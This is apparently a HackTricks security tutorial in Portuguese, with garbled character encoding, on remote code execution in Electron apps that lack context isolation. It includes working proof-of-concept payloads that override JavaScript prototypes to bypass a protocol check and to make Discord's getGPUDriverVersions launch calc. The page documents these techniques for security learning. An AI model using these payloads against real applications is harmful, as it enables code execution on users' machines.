# Execu√ß√£o remota de c√≥digo (RCE) via contexto de isolamento do Electron

<details>

<summary><strong>Aprenda hacking na AWS do zero ao avan√ßado com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se voc√™ deseja ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** üí¨ [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para os reposit√≥rios** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Exemplo 1

Exemplo de [https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=30](https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=30)

Este c√≥digo abre links http(s) com o navegador padr√£o:

![](<../../../.gitbook/assets/image (375) (1) (1).png>)

Algo como `file:///C:/Windows/systemd32/calc.exe` poderia ser usado para executar uma calculadora, o `SAFE_PROTOCOLS.indexOf` est√° impedindo isso.

Portanto, um atacante poderia injetar este c√≥digo JS via XSS ou navega√ß√£o arbitr√°ria na p√°gina:
```html
<script>
Array.prototype.indexOf = function(){
return 1337;
}
</script>
```
Como a chamada para `SAFE_PROTOCOLS.indexOf` sempre retornar√° 1337, o atacante pode contornar a prote√ß√£o e executar a calculadora. Exploit final:
```html
<script>
Array.prototype.indexOf = function(){
return 1337;
}
</script>
<a href="file:///C:/Windows/systemd32/calc.exe">CLICK</a>
```
Verifique os slides originais para outras maneiras de executar programas sem precisar de uma solicita√ß√£o de permiss√£o.

Aparentemente, outra maneira de carregar e executar c√≥digo √© acessar algo como `file://127.0.0.1/electron/rce.jar`

## Exemplo 2: Discord App RCE

Exemplo de [https://mksben.l0.cm/2020/10/discord-desktop-rce.html?m=1](https://mksben.l0.cm/2020/10/discord-desktop-rce.html?m=1)

Ao verificar os scripts de pr√©-carregamento, descobri que o Discord exp√µe a fun√ß√£o, que permite que alguns m√≥dulos permitidos sejam chamados via `DiscordNative.nativeModules.requireModule('NOME-DO-M√ìDULO')`, na p√°gina da web.\
Aqui, n√£o pude usar m√≥dulos que podem ser usados para RCE diretamente, como o m√≥dulo _child\_process_, mas **encontrei um c√≥digo onde RCE pode ser alcan√ßado substituindo os m√©todos JavaScript integrados** e interferindo na execu√ß√£o do m√≥dulo exposto.

A seguir est√° a PoC. Consegui confirmar que o aplicativo **calc** √© **aberto** quando eu **chamo a fun√ß√£o `getGPUDriverVersions`** que est√° definida no m√≥dulo chamado "_discord\_utils_" no devTools, enquanto **substituo o `RegExp.prototype.test` e `Array.prototype.join`**.
```javascript
RegExp.prototype.test=function(){
return false;
}
Array.prototype.join=function(){
return "calc";
}
DiscordNative.nativeModules.requireModule('discord_utils').getGPUDriverVersions();
```
A fun√ß√£o `getGPUDriverVersions` tenta executar o programa usando a biblioteca "_execa_", como mostrado abaixo:
```javascript
module.exports.getGPUDriverVersions = async () => {
if (process.platform !== 'win32') {
return {};
}

const result = {};
const nvidiaSmiPath = `${process.env['ProgramW6432']}/NVIDIA Corporation/NVSMI/nvidia-smi.exe`;

try {
result.nvidia = parseNvidiaSmiOutput(await execa(nvidiaSmiPath, []));
} catch (e) {
result.nvidia = {error: e.toString()};
}

return result;
};
```
Normalmente, o _execa_ tenta executar "_nvidia-smi.exe_", que √© especificado na vari√°vel `nvidiaSmiPath`, no entanto, devido √† substitui√ß√£o de `RegExp.prototype.test` e `Array.prototype.join`, **o argumento √© substitu√≠do por "**_**calc**_**" no processamento interno do \_execa**\_**.

Especificamente, o argumento √© substitu√≠do alterando as seguintes duas partes.

[https://github.com/moxystudio/node-cross-spawn/blob/16feb534e818668594fd530b113a028c0c06bddc/lib/parse.js#L36](https://github.com/moxystudio/node-cross-spawn/blob/16feb534e818668594fd530b113a028c0c06bddc/lib/parse.js#L36)

[https://github.com/moxystudio/node-cross-spawn/blob/16feb534e818668594fd530b113a028c0c06bddc/lib/parse.js#L55](https://github.com/moxystudio/node-cross-spawn/blob/16feb534e818668594fd530b113a028c0c06bddc/lib/parse.js#L55)

<details>

<summary><strong>Aprenda hacking AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se voc√™ quiser ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF** Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** üí¨ [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para os** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) reposit√≥rios do github.

</details>
